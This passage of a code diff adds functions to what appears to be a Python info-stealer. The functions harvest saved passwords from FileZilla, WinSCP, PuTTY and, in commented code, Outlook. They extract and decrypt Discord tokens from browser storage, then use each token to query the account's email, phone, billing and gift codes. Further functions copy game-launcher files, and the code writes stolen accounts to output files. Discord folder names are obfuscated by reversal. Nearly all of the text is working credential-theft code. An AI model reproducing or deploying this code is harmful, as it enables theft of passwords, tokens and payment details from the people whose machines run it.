+                shutil.copy2(Path(store_db), mailbird_db)
+    
+        except Exception as e:
+            error_handler(f"backupmailbird error - {str(e)}")
+            pass
+
+    # async def DecryptOutlook(encrypted_value) -> None:
+    #     try:
+    #         encrypted_data = encrypted_value[1:]
+    #         blob_in = ctypes.windll.kernel32.LocalAlloc(0x40, len(encrypted_data))
+    #         ctypes.windll.kernel32.RtlMoveMemory(blob_in, bytes(encrypted_data), len(encrypted_data))
+
+    #         data_out = ctypes.c_void_p()
+    #         if ctypes.windll.crypt32.CryptUnprotectData(
+    #             ctypes.byref(ctypes.c_buffer(encrypted_data)), None, None, None, None, 0, ctypes.byref(data_out)):
+    #             decrypted_data = ctypes.cast(data_out, ctypes.POINTER(ctypes.c_ubyte))
+    #             length = ctypes.windll.kernel32.LocalSize(data_out)
+    #             return bytes(bytearray([decrypted_data[i] for i in range(length)])).decode("utf-8").replace("\x00", "")
+    #     except Exception as e:
+    #         error_handler(f"decrypt outlook error - {str(e)}")
+    #         return "null"
+
+    # async def get_info_from_registry(self, path, value_name) -> None:
+    #     try:
+    #         registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_READ)
+    #         value, regtype = reg.QueryValueEx(registry_key, value_name)
+    #         reg.CloseKey(registry_key)
+    #         return value
+    #     except Exception as e:
+    #         error_handler(f"get info from registry error - {str(e)}")
+    #         return None
+
+    # async def StealOutlook(self, directory_path) -> None:
+    #     mail_client_regex = re.compile(r'^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})$')
+    #     smtp_client_regex = re.compile(r'^(?!:\/\/)([a-zA-Z0-9-_]+\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\.[a-zA-Z]{2,11}?$')
+
+    #     outlook_path = os.path.join(directory_path, "Email", 'OutlookMail')
+
+    #     reg_directories = [
+    #         r"Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676",
+    #         r"Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676",
+    #         r"Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676",
+    #         r"Software\Microsoft\Windows Messaging Subsystem\Profiles\9375CFF0413111d3B88A00104B2A6676"
+    #     ]
+
+    #     mail_clients = [
+    #         "SMTP Email Address", "SMTP Server", "POP3 Server", "POP3 User Name", "SMTP User Name", "NNTP Email Address",
+    #         "NNTP User Name", "NNTP Server", "IMAP Server", "IMAP User Name", "Email", "HTTP User", "HTTP Server URL",
+    #         "POP3 User", "IMAP User", "HTTPMail User Name", "HTTPMail Server", "SMTP User", "POP3 Password2",
+    #         "IMAP Password2", "NNTP Password2", "HTTPMail Password2", "SMTP Password2", "POP3 Password", "IMAP Password",
+    #         "NNTP Password", "HTTPMail Password", "SMTP Password",
+    #     ]
+
+    #     data = ""
+    #     for directory in reg_directories:
+    #         data += await self.get_data_from_registry(directory, mail_clients, mail_client_regex, smtp_client_regex)
+
+    #     if data:
+    #         os.makedirs(outlook_path, exist_ok=True)
+    #         with open(os.path.join(outlook_path, "Outlook.txt"), "w") as file:
+    #             file.write(data + "\r\n")
+
+    # async def get_data_from_registry(self, path, clients, mail_client_regex, smtp_client_regex) -> None:
+    #     data = ""
+    #     try:
+    #         for client in clients:
+    #             try:
+    #                 value = await self.get_info_from_registry(path, client)
+    #                 if value and "Password" in client and "2" not in client:
+    #                     data += f"{client}: {await self.DecryptOutlook(value)}\r\n"
+    #                 elif value and (smtp_client_regex.match(value) or mail_client_regex.match(value)):
+    #                     data += f"{client}: {value}\r\n"
+    #                 elif value:
+    #                     decoded_value = value.decode("utf-8").replace("\x00", "")
+    #                     data += f"{client}: {decoded_value}\r\n"
+    #             except Exception as e:
+    #                 error_handler(f"get data from reg error - {str(e)}")
+    #                 pass
+
+    #         with reg.OpenKey(reg.HKEY_CURRENT_USER, path) as key:
+    #             subkeys_count = reg.QueryInfoKey(key)[0]
+    #             for i in range(subkeys_count):
+    #                 subkey_name = reg.EnumKey(key, i)
+    #                 data += await self.get_data_from_registry(f"{path}\\{subkey_name}", clients, mail_client_regex, smtp_client_regex)
+
+    #     except Exception as e:
+    #         error_handler(f"get data from registry error - {str(e)}")
+    #         pass
+
+    #     return data
+
+    async def StealFileZilla(self, directory_path: str) -> None:
+        try:
+            filezilla_folder = os.path.join(self.appdata, 'FileZilla')
+            if not os.path.isdir(filezilla_folder):
+                return
+            
+            filezilla_hosts = os.path.join(directory_path, "FTP Clients", 'FileZilla')
+            os.makedirs(filezilla_hosts, exist_ok=True)
+            recent_servers_xml = os.path.join(filezilla_folder, 'recentservers.xml')
+            site_manager_xml = os.path.join(filezilla_folder, 'sitemanager.xml')
+
+            def parse_server_info(xml_content):
+                host_match = re.search(r"<Host>(.*?)</Host>", xml_content)
+                port_match = re.search(r"<Port>(.*?)</Port>", xml_content)
+                user_match = re.search(r"<User>(.*?)</User>", xml_content)
+                pass_match = re.search(r"<Pass encoding=\"base64\">(.*?)</Pass>", xml_content)
+
+                server_host = host_match.group(1) if host_match else ""
+                server_port = port_match.group(1) if port_match else ""
+                server_user = user_match.group(1) if user_match else ""
+                if not server_user:
+                    return f"Host: {server_host}\nPort: {server_port}\n"
+                encoded_pass = pass_match.group(1) if pass_match else ""
+                decoded_pass = (encoded_pass and 
+                                base64.b64decode(encoded_pass).decode('utf-8') if encoded_pass else "")
+                return f"Host: {server_host}\nPort: {server_port}\nUser: {server_user}\nPass: {decoded_pass}\n"
+
+            servers_info = []
+            for xml_file in [recent_servers_xml, site_manager_xml]:
+                if os.path.isfile(xml_file):
+                    with open(xml_file, 'r') as file:
+                        xml_content = file.read()
+                        server_entries = re.findall(r"<Server>(.*?)</Server>", xml_content, re.DOTALL)
+                        for server_entry in server_entries:
+                            servers_info.append(parse_server_info(server_entry))
+
+            with open(os.path.join(filezilla_hosts, 'Hosts.txt'), 'w') as file:
+                file.write("\n".join(servers_info))
+                
+            if len(os.listdir(filezilla_hosts)) == 0:
+                os.rmdir(filezilla_hosts)
+        except Exception as e:
+            error_handler(f"filezilla error - {str(e)}")
+            pass
+
+
+    async def StealWinSCP(self, directory_path: str) -> None:
+        try:
+            registry_path = r"SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
+            winscp_session = os.path.join(directory_path, "FTP Clients", 'WinSCP')
+            os.makedirs(winscp_session, exist_ok=True)
+            output_path = os.path.join(winscp_session, 'WinSCP-sessions.txt')
+            output = "WinSCP Sessions\n\n"
+            
+            def decrypt_winscp_password(hostname, username, password):
+                check_flag = 255
+                magic = 163
+                key = hostname + username
+                remaining_pass = password
+                flag_and_pass = decrypt_next_character_winscp(remaining_pass)
+                stored_flag = flag_and_pass['flag']
+                if stored_flag == check_flag:
+                    remaining_pass = remaining_pass[2:]
+                    flag_and_pass = decrypt_next_character_winscp(remaining_pass)
+                length = flag_and_pass['flag']
+                remaining_pass = remaining_pass[(flag_and_pass['flag'] * 2):]
+                final_output = ""
+                for _ in range(length):
+                    flag_and_pass = decrypt_next_character_winscp(remaining_pass)
+                    final_output += chr(flag_and_pass['flag'])
+                if stored_flag == check_flag:
+                    return final_output[len(key):]
+                return final_output
+
+            def decrypt_next_character_winscp(remaining_pass):
+                magic = 163
+                firstval = "0123456789ABCDEF".index(remaining_pass[0]) * 16
+                secondval = "0123456789ABCDEF".index(remaining_pass[1])
+                added = firstval + secondval
+                decrypted_result = ((~(added ^ magic)) + 256) % 256
+                return {'flag': decrypted_result, 'remaining_pass': remaining_pass[2:]}
+
+            try:
+                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path) as reg_key:
+                    index = 0
+                    while True:
+                        try:
+                            session_name = winreg.EnumKey(reg_key, index)
+                            session_path = f"{registry_path}\\{session_name}"
+                            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, session_path) as session_key:
+                                hostname = winreg.QueryValueEx(session_key, 'HostName')[0]
+                                username = winreg.QueryValueEx(session_key, 'UserName')[0]
+                                encrypted_password = winreg.QueryValueEx(session_key, 'Password')[0]
+                                password = decrypt_winscp_password(hostname, username, encrypted_password)
+                                output += f"Session  : {session_name}\nHostname : {hostname}\nUsername : {username}\nPassword : {password}\n\n"
+                        except OSError:
+                            break
+                        index += 1
+            except OSError as e:
+                error_handler(f"os error winscp error - {str(e)}")
+
+            with open(output_path, 'w') as file:
+                file.write(output)
+
+        except OSError:
+            error_handler(f"all os error winscp - {str(e)}")
+        except Exception as e:
+            error_handler(f"winscp error - {str(e)}")
+
+
+    async def StealPutty(self, directory_path: str) -> None:
+        try:
+            database_path = self.get_default_database()
+        except Exception as e:
+            error_handler(f"get default database putty error - {str(e)}")
+            return
+
+        full_path = os.path.join(directory_path, "FTP Clients", "Putty", database_path)
+        
+        if os.path.exists(full_path):
+            pwd_found = await self.parse_xml(full_path)
+            await self.save_to_file(pwd_found, directory_path)
+        else:
+            pass
+
+    def get_default_database(self) -> str:
+        access_read = win32con.KEY_READ | win32con.KEY_ENUMERATE_SUB_KEYS | win32con.KEY_QUERY_VALUE
+        key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, 'Software\\ACS\\PuTTY Connection Manager', 0, access_read)
+        this_name, _ = win32api.RegQueryValueEx(key, 'DefaultDatabase')
+        return str(this_name) if this_name else ' '
+
+    async def parse_xml(self, xml_file: str) -> list:
+        try:
+            tree = ET.parse(xml_file)
+            root = tree.getroot()
+            pwd_found = []
+
+            for connection in root.findall('connection'):
+                values = {}
+                for child in connection:
+                    if child.tag in ['name', 'protocol', 'host', 'port', 'description', 'login', 'password']:
+                        values[child.tag] = child.text
+
+                if values:
+                    pwd_found.append(values)
+
+            return pwd_found
+        except ET.ParseError as e:
+            error_handler(f"putty parse xml error - {str(e)}")
+            return []
+
+    async def save_to_file(self, data: list, directory_path: str) -> None:
+        output_file = os.path.join(directory_path, "FTP Clients", "Putty", 'putty_connections.txt')
+        try:
+            with open(output_file, 'w') as file:
+                for entry in data:
+                    for key, value in entry.items():
+                        file.write(f"{key}: {value}\n")
+                    file.write("\n")
+        except IOError as e:
+            error_handler(f"ioerror putty save to file - {str(e)}")
+            pass
+
     async def StealPasswordManagers(self, directory_path: str) -> None:
         try:
             browser_paths = {
@@ -553,6 +1443,418 @@ class get_data:
         except Exception as e:
             error_handler(f"password manager error - {str(e)}")
 
+
+
+
+
+
+
+
+
+    async def StealDiscord(self) -> None:
+        try:
+            baddglist = [
+                {"N": 'Active_Developer', 'V': 4194304, 'E': 'Active Developer '},
+                {"N": 'Early_Verified_Bot_Developer', 'V': 131072, 'E': "Verified Bot Developer "},
+                {"N": 'Bug_Hunter_Level_2', 'V': 16384, 'E': "Bug Hunter Lvl 2 "},
+                {"N": 'Early_Supporter', 'V': 512, 'E': "Early Supporter "},
+                {"N": 'House_Balance', 'V': 256, 'E': "House Balance "},
+                {"N": 'House_Brilliance', 'V': 128, 'E': "House Brilliance "},
+                {"N": 'House_Bravery', 'V': 64, 'E': "House Bravery "},
+                {"N": 'Bug_Hunter_Level_1', 'V': 8, 'E': "Bug Hunter Lvl 1 "},
+                {"N": 'HypeSquad_Events', 'V': 4, 'E': "HypeSquad "},
+                {"N": 'Partnered_Server_Owner', 'V': 2, 'E': "Partnered Server Owner "},
+                {"N": 'Discord_Employee', 'V': 1, 'E': "Discord Employee "}
+            ]
+
+            async def UhqGuild(token) -> str:
+                try:
+                    uhq = []
+                    headers = {
+                        "Authorization": token,
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+                    }
+                    async with aiohttp.ClientSession() as session:
+                        async with session.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers) as response:
+                            guilds = await response.json()
+
+                    for guild in guilds:
+                        if guild["approximate_member_count"] < 30 or not (guild["owner"] or guild["permissions"] == "4398046511103"):
+                            continue
+                        
+                        async with aiohttp.ClientSession() as session:
+                            async with session.get(f"https://discord.com/api/v6/guilds/{guild['id']}/invites", headers=headers) as response:
+                                invites = await response.json()
+
+                        link = invites[0]['code'] if invites else None
+
+                        uhq.append(f"[{guild['name']}]({f'https://discord.gg/{link}' if link else ''}) ({guild['id']}) {guild['approximate_member_count']} Members")
+
+                    return '\n'.join(uhq) if uhq else "No HQ Guilds"
+                except Exception as e:
+                    error_handler(f"uhqguild error - {str(e)}")
+                    return "No HQ Guilds"
+
+
+            async def GetUhqFriend(token, max_friends=5) -> str:
+                try:
+                    headers = {
+                        "Authorization": token,
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+                    }
+                    url = "https://discord.com/api/v6/users/@me/relationships"
+                    
+                    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
+                        async with session.get(url, headers=headers) as response:
+                            friendlist = await response.json()
+
+
+                    uhqlist = ''
+                    friend_count = 0 
+
+                    for friend in friendlist:
+                        OwnedBadges = ''
+                        flags = friend['user']['public_flags']
+                        for badge in baddglist:
+                            if flags // badge["V"] != 0 and friend['type'] == 1:
+                                if not "House" in badge["N"] and not badge["N"] == "Active_Developer":
+                                    OwnedBadges += badge["E"]
+                                flags = flags % badge["V"]
+                        if OwnedBadges != '':
+                            uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
+                    return uhqlist if uhqlist != '' else "No HQ Friends"
+                except Exception as e:
+                    error_handler(f"uhq firends error - {str(e)}")
+
+            def GetBadge(flags):
+                if flags == 0:
+                    return ''
+
+                owned_badges = ''
+                for badge in baddglist:
+                    if flags // badge["V"] != 0:
+                        owned_badges += badge["E"]
+                        flags = flags % badge["V"]
+                return owned_badges
+
+            async def GetTokenInfo(token):
+                try:
+                    headers = {
+                        "Authorization": token,
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+                    }
+                    url = "https://discord.com/api/v6/users/@me"
+                    async with aiohttp.ClientSession() as session:
+                        async with session.get(url, headers=headers) as response:
+                            user_info = await response.json()
+
+                    username = user_info["username"]
+
+                    globalusername = 'None'
+                    if "global_name" in user_info:
+                        globalusername = user_info["global_name"]
+
+                    bio = "None"
+                    if "bio" in user_info:
+                        bio = user_info["bio"]
+                        if len(bio) > 70:
+                            bio = bio[:67] + "..."
+
+                    nsfw = ""
+                    if "nsfw_allowed" in user_info:
+                        nsfw = user_info["nsfw_allowed"]
+                        if nsfw == "False":
+                            nsfw = "False"
+                        else:
+                            nsfw = "True"
+                            
+                    hashtag = user_info["discriminator"]
+                    email = user_info.get(f"email", "")
+                    user_id = user_info["id"]
+
+                    flags = user_info[f"public_flags"]
+                    nitros = "No Nitro"
+                    phone = "No Phone"
+
+                    if "premium_type" in user_info:
+                        nitros = user_info["premium_type"]
+                        if nitros == 1:
+                            nitros = "Nitro Classic "
+                        elif nitros == 2:
+                            nitros = "Nitro Boost "
+                        elif nitros == 3:
+                            nitros =  "Nitro Basic "
+
+                    if "phone" in user_info:
+                        phone = f'`{user_info["phone"]}`'
+
+                    return username, globalusername, bio, nsfw, hashtag, email, user_id, flags, nitros, phone
+                except Exception as e:
+                    error_handler(f"token info error - {str(e)}")
+
+
+            async def CheckToken(token) -> bool:
+                headers = {
+                    "Authorization": token,
+                    "Content-Type": "application/json",
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+                }
+
+                url = "https://discord.com/api/v6/users/@me"
+                try:
+                    async with aiohttp.ClientSession() as session:
+                        async with session.get(url, headers=headers) as response:
+                            if response.status == 401:
+                                return False
+                            else:
+                                return True
+                except Exception as e:
+                    error_handler(f"check token error - {str(e)}")
+                    return False
+
+            async def GetBilling(token):
+                try:
+                    headers = {
+                        "Authorization": token,
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+                    }
+
+                    url = "https://discord.com/api/users/@me/billing/payment-sources"
+                    try:
+                        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
+                            async with session.get(url, headers=headers) as response:
+                                response_text = await response.text()
+                                billing_json = json.loads(response_text)
+
+                    except Exception as e:
+                        error_handler(f"get billing url error - {str(e)}")
+                        return False
+                    
+                    if not billing_json:
+                        return "False"
+                    
+                    billing = ""
+                    for method in billing_json:
+                        if not method["invalid"]:
+                            if method["type"] == 1:
+                                billing += "Credit Card "
+                            elif method["type"] == 2:
+                                billing += "PayPal "
+                            elif method["type"] == 17:
+                                billing += "CashApp "
+                    return billing
+                except Exception as e:
+                    error_handler(f"get billing error - {str(e)}")
+
+            async def GetBack() -> None:
+                try:
+                    path = os.environ["HOMEPATH"]
+                    code_path = '\\Downloads\\discord_backup_codes.txt'
+                    if os.path.exists(path + code_path):
+                        with open(path + code_path, 'r', encoding='utf-8') as file:
+                            backup = file.readlines()
+                            
+                        return backup
+                            
+                except Exception as e:
+                    error_handler(f"get backup discord code - {str(e)}")
+                    return 'No backup code saved'
+                
+            async def GetDiscordConnection(token) -> None:
+                try:
+                    headers = {
+                        "Authorization": token,
+                        "Content-Type": "application/json",
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+                    }
+
+                    async with aiohttp.ClientSession() as session:
+                        async with session.get("https://discord.com/api/v6/users/@me/connections", headers=headers) as response:
+                            if response.status == 200:
+                                data = await response.json()
+
+                                Services = {
+                                    "battlenet": "https://battle.net",
+                                    "ebay": "https://ebay.com",
+                                    "epicgames": "https://epicgames.com",
+                                    "facebook": "https://facebook.com",
+                                    "github": "https://github.com",
+                                    "instagram": "https://instagram.com",
+                                    "leagueoflegends": "https://leagueoflegends.com",
+                                    "paypal": "https://paypal.com",
+                                    "playstation": "https://playstation.com",
+                                    "reddit": "https://reddit.com",
+                                    "riotgames": "https://riotgames.com",
+                                    "spotify": "https://spotify.com",
+                                    "skype": "https://skype.com",
+                                    "steam": "https://store.steampowered.com",
+                                    "tiktok": "https://tiktok.com",
+                                    "twitch": "https://twitch.tv",
+                                    "twitter": "https://twitter.com",
+                                    "xbox": "https://xbox.com",
+                                    "youtube": "https://youtube.com"
+                                }
+
+                                connections_list = []
+                                for connection in data:
+                                    connections_list.append(f"Username: {connection['name']}\nServices : [{connection['type']}]({Services.get(connection['type'], 'Unknown')})\n")
+                                return connections_list
+                            else:
+                                return []
+                except Exception as e:
+                    error_handler(f"discord connections error - {str(e)}")
+        
+            async def GetGift(token) -> None:
+                try:
+                    async with aiohttp.ClientSession() as session:
+                        async with session.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}) as response:
+                            if response.status == 200:
+                                gift_codes = await response.json()
+                                if gift_codes:
+                                    codes = []
+                                    for code in gift_codes:
+                                        name = code['promotion']['outbound_title']
+                                        code_value = code['code']
+                                        data = f"Name: {name}\nCode: {code_value}"
+                                        codes.append(data)
+                                    return '\n\n'.join(codes) if codes else 'No Gift'
+                                else:
+                                    return 'No Gift'
+                            else:
+                                return 'No Gift'
+                except Exception as e:
+                    error_handler(f"get gifts error - {str(e)}")
+            processed_tokens = []
+            processed_id = []
+            async def UploadToken(token, path) -> None:
+                try:
+                    if token in processed_tokens:
+                        return
+                    
+                    processed_tokens.append(token)
+                    username, globalusername, bio, nsfw, hashtag, email, user_id, flags, nitro, phone = await GetTokenInfo(token)
+                
+                    if user_id in processed_id:
+                        return
+                 
+                    processed_id.append(user_id)                    
+                 
+                    back = await GetBack()
+                    billing = await GetBilling(token)
+                    badge = GetBadge(flags)
+                    friends = await GetUhqFriend(token)
+                    guild = await UhqGuild(token)
+                    gift = await GetGift(token)
+                    connections = await GetDiscordConnection(token)
+
+                    if isinstance(connections, list):
+                        connections_str = "\n".join(connections) if connections else 'No Connections'
+                    else:
+                        connections_str = 'No Connections'
+                    if friends == '':
+                        friends = "No Rare Friends"
+                    if not billing:
+                        billing = "No Billing"
+                    if not badge:
+                        badge = "No Badge"
+                    if not phone: 
+                        phone = "No Phone"
+                    if hashtag == '0':
+                        hashtag = ''
+                    
+                except Exception as e:
+                    error_handler(f"upload token error - {str(e)}")
+                else:
+                    ListFonction.discord.append(f"Token: {token}\nPath: {path}\nUser: {username}#{hashtag} ({user_id}) Global Username : {globalusername}\nPhone: {phone}\nEmail: {email}\nNsfw Enable?: {nsfw}\nBadge: {nitro}{badge}\nBilling: {billing}\nBiography: {bio}\nHQ Friends: {friends}\nGuilds: {guild}\nConnection: {connections_str}\nGift: {gift}\nBackup Code: {back}\n==============================================\n")
+
+                            
+            tokens = []
+            async def GetToken(path, arg):
+                try:
+                    if not os.path.exists(path):
+                        return
+
+                    path += arg
+
+                    for file in os.listdir(path):
+                        if file.endswith(".log") or file.endswith(".ldb"):
+                            with open(f"{path}\\{file}", 'r', errors="ignore") as f:
+                                for line in [x.strip() for x in f.readlines() if x.strip()]:
+                                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
+                                        for token in re.findall(regex, line):
+                                            if await CheckToken(token):
+                                                if token not in tokens:
+                                                    tokens.append(token)
+                                                    await UploadToken(token, path)
+
+                except Exception as e:
+                    error_handler(f"get token error - {str(e)}")
+
+            async def GetDiscord(path, arg):
+                try:
+                    if not os.path.exists(f"{path}/Local State"):
+                        return
+
+                    pathC = path + arg
+                    pathKey = path + "/Local State"
+
+                    key = WindowsApi.GetKey(pathKey)
+
+                    for file in os.listdir(pathC):
+                        if file.endswith(".log") or file.endswith(".ldb"):
+                            with open(f"{pathC}\\{file}", 'r', errors="ignore") as f:
+                                for line in [x.strip() for x in f.readlines() if x.strip()]:
+                                    for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                                        TokenDecoded = WindowsApi.Decrpytion(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), key)
+                                        if await CheckToken(TokenDecoded):
+                                            if TokenDecoded not in tokens:
+                                                tokens.append(TokenDecoded)
+                                                await UploadToken(TokenDecoded, path)
+
+                except Exception as e:
+                    error_handler(f"get discord error - {str(e)}")
+
+            browserPaths = [        
+                [f"{self.appdata}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
+                [f"{self.appdata}/Opera Software/Opera Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
+                [f"{self.appdata}/Opera Software/Opera Neon/User Data/Default", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnknn" ],
+                [f"{self.localappdata}/Google/Chrome/User Data", f"Chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
+                [f"{self.localappdata}/Google/Chrome SxS/User Data", f"Chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
+                [f"{self.localappdata}/BraveSoftware/Brave-Browser/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
+                [f"{self.localappdata}/Yandex/YandexBrowser/User Data", "yandex.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
+                [f"{self.localappdata}/Microsoft/Edge/User Data", "edge.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ]
+            ]
+
+            Discord = 'drocsiD'
+            Lightcord = 'drocthgiL'
+            BTPdiscord = 'btpdrocsid'
+            Canary = 'yranacdrocsid'
+
+            discordPaths = [        
+                [f"{self.appdata}/{Discord[::-1]}", "/Local Storage/leveldb"],
+                [f"{self.appdata}/{Lightcord[::-1]}", "/Local Storage/leveldb"],
+                [f"{self.appdata}/{Canary[::-1]}", "/Local Storage/leveldb"],
+                [f"{self.appdata}/{BTPdiscord[::-1]}", "/Local Storage/leveldb"],
+            ]                    
+
+            try:
+                for patt in browserPaths:
+                    await GetToken(patt[0], patt[2])
+                for patt in discordPaths:
+                    await GetDiscord(patt[0], patt[1])
+            except Exception as e:
+                error_handler(f"run browser & token error - {str(e)}")
+
+        except Exception as e:
+            error_handler(f"discord error - {str(e)}")
+
+
+
+
+
     async def StealSteamUser(self) -> None:
         try:
             all_disks = []
@@ -600,6 +1902,24 @@ class get_data:
         except Exception as e:
             error_handler(f"steam user error - {str(e)}")
 
+
+    async def StealUbisoft(self, directory_path: str) -> None:
+        try:
+            ubisoft_path = os.path.join(self.localappdata, "Ubisoft Game Launcher")
+            copied_path = os.path.join(directory_path, "Games", "Uplay")
+            if os.path.isdir(ubisoft_path):
+                if not os.path.exists(copied_path):
+                    os.mkdir(copied_path)
+                for file in os.listdir(ubisoft_path):
+                    name_of_files = os.path.join(ubisoft_path, file)
+                    try:
+                        shutil.copy(name_of_files, os.path.join(copied_path, file))
+                    except:
+                        continue
+        except Exception as e:
+            error_handler(f"ubisoft error - {str(e)}")
+            pass
+
     async def StealEpicGames(self, directory_path: str) -> None:
         try:
             epic_path = os.path.join(self.localappdata, "EpicGamesLauncher", "Saved", "Config", "Windows")
@@ -616,6 +1936,16 @@ class get_data:
             error_handler(f"epicgames error - {str(e)}")
             pass
 
+    async def StealGrowtopia(self, directory_path: str) -> None:
+        try:
+            growtopia_path = os.path.join(self.localappdata, "Growtopia", "save.dat")
+            copied_path = os.path.join(directory_path, "Games", "Growtopia")
+            if os.path.isfile(growtopia_path):
+                shutil.copy(growtopia_path, os.path.join(copied_path, "save.dat"))
+        except Exception as e:
+            error_handler(f"growtopia error - {str(e)}")
+            pass
+
     async def StealSteamFiles(self, directory_path: str) -> None:
         try:
             save_path = os.path.join(directory_path)
@@ -629,6 +1959,43 @@ class get_data:
             error_handler(f"steamfiles error - {str(e)}")
             return "null"
         
+    
+
+    async def StealBattleNet(self, directory_path) -> None:
+        battle_net_path = os.path.join(self.appdata, 'Battle.net')
+        if not os.path.exists(battle_net_path):
+            return
+
+        try:
+
+            battle_path = os.path.join(directory_path, "Games", "Battle Net")
+            os.makedirs(battle_path, exist_ok=True)
+
+            for pattern in ["*.db", "*.config"]:
+                for root, dirs, files in os.walk(battle_net_path):
+                    for file in files:
+                        if file.endswith(tuple(pattern.split("*"))):
+                            try:
+                                file_path = os.path.join(root, file)
+                                if os.path.basename(root) == "Battle.net":
+                                    destination_dir = directory_path
+                                else:
+                                    destination_dir = os.path.join(directory_path, os.path.basename(root))
+
+                                os.makedirs(destination_dir, exist_ok=True)
+
+                                shutil.copy(file_path, os.path.join(destination_dir, file))
+                            except Exception as e:
+                                error_handler(f"get battlenet files error - {str(e)}")
+                                return
+
+
+        except Exception as e:
+            error_handler(f"battlenet error - {str(e)}")
+            pass
+
+
+
     async def InsideFolder(self) -> None:
         try:
             hostname = platform.node()
@@ -690,9 +2057,29 @@ class get_data:
                         file.write(autofill)
 
 
+            if ListFonction.RedditAccounts:
+                with open(os.path.join(filePath, "Sessions", "reddit_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    for value in ListFonction.RedditAccounts:
+                        file.write(value)
             if ListFonction.InstagramAccounts:
                 with open(os.path.join(filePath, "Sessions", "instagram_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     for value in ListFonction.InstagramAccounts:
+                        file.write(value)
+            if ListFonction.GuildedAccounts:
+                with open(os.path.join(filePath, "Sessions", "guilded_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    for value in ListFonction.GuildedAccounts:
+                        file.write(value)
+            if ListFonction.PatreonAccounts:
+                with open(os.path.join(filePath, "Sessions", "patreon_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    for value in ListFonction.PatreonAccounts:
+                        file.write(value)
+            if ListFonction.SpotifyAccount:
+                with open(os.path.join(filePath, "Sessions", "spotify_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    for value in ListFonction.SpotifyAccount:
+                        file.write(value)
+            if ListFonction.TwitchAccounts:
+                with open(os.path.join(filePath, "Sessions", "twitch_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    for value in ListFonction.TwitchAccounts:
                         file.write(value)
             if ListFonction.TwitterAccounts:
                 with open(os.path.join(filePath, "Sessions", "twitter_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
@@ -702,17 +2089,33 @@ class get_data:
                 with open(os.path.join(filePath, "Sessions", "tiktok_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     for value in ListFonction.TikTokAccounts:
                         file.write(value)
+            if ListFonction.RiotUserAccounts:
+                with open(os.path.join(filePath, "Sessions", "riot_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
+                    for value in ListFonction.RiotUserAccounts:
+                        file.write(value)
             if ListFonction.SteamUserAccounts:
                 with open(os.path.join(filePath, "Sessions", "steam_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     for value in ListFonction.SteamUserAccounts:
                         file.write(value)
+            if ListFonction.RobloxAccounts:
